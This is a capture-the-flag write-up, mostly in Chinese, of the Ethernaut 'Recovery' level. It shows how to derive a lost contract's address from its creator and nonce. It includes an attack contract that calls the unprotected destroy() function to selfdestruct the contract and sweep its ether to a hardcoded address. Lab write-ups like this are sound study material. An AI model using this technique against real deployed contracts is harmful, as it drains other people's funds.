# 17-Recovery

日期: 21/08/2024
难易: 中等
漏洞小结: 合约生成
简单明了: 需要了解合约是如何生成的

# 问题描述

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

# 攻击思路

其实完全没有思路，有点超出认知范围，靠着GPT才知道，详见**小白的思考**

# 攻击方式

```solidity
contract AttackRecovery{
    address constant  TOADDRESS = 0xF06fF3cb536197bea6d3AF6DE30Bd96aE4533300;

    function computeAddress(address _creator, uint256 _nonce) public pure returns (address) {
    return address(uint160(uint(keccak256(abi.encodePacked(
        bytes1(0xd6),
        bytes1(0x94),
        _creator,
        bytes1(uint8(_nonce))
    )))));
}
    function attack(address _CreatorAddress) public{
        address computedAddress = computeAddress(_CreatorAddress,1);
        SimpleToken st = SimpleToken(payable(computedAddress));
        st.destroy(payable(TOADDRESS));
    }
}
```

# Ethernuat总结

Contract addresses are deterministic and are calculated by `keccak256(address, nonce)` where the `address` is the address of the contract (or ethereum address that created the transaction) and `nonce` is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.

If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.

# 小白的思考

这个挑战的核心在于理解 Solidity 中的合约地址是如何生成的。

### 关键点：合约地址的生成规则

在以太坊中，当一个合约被创建时，它的地址是通过以下方式计算的：

```jsx
address = keccak256(rlp.encode([sender, nonce]))
```

其中`sender` 是部署合约的地址。

- `nonce` 是发送方的交易次数（也就是该地址发起的交易数量）。

在这个挑战中，`Recovery` 合约生成了一个 `SimpleToken` 合约，而这个新合约的地址就是根据 `Recovery` 合约的地址和它的 nonce 计算得出的。

### 解题步骤

1. **找到生成的 `SimpleToken` 合约的地址：**
因为我们知道 `Recovery` 合约创建了这个代币合约，并且它的地址是通过特定规则生成的，所以你可以通过计算 `Recovery` 合约地址和它的 nonce 推导出 `SimpleToken` 合约的地址。对于第一个创建的合约，nonce 一般是 `1`。
2. **通过推导出来的地址与丢失的合约进行交互：**
找到这个合约地址后，你可以调用 `destroy` 函数，将合约中剩余的 ETH 发送到你指定的地址。

具体实现可以在 Web Console 或 Remix 中利用计算合约地址的方式进行推导。你可以使用以下代码计算：

```solidity
function computeAddress(address _creator, uint256 _nonce) public pure returns (address) {
    return address(uint160(uint(keccak256(abi.encodePacked(
        bytes1(0xd6),
        bytes1(0x94),
        _creator,
        bytes1(uint8(_nonce))
    )))));
}
```

通过这个地址，你可以调用 `SimpleToken` 的 `destroy` 函数来销毁合约并回收其中的 0.001 ETH。

你可以先尝试这些步骤，然后我们再讨论遇到的任何问题。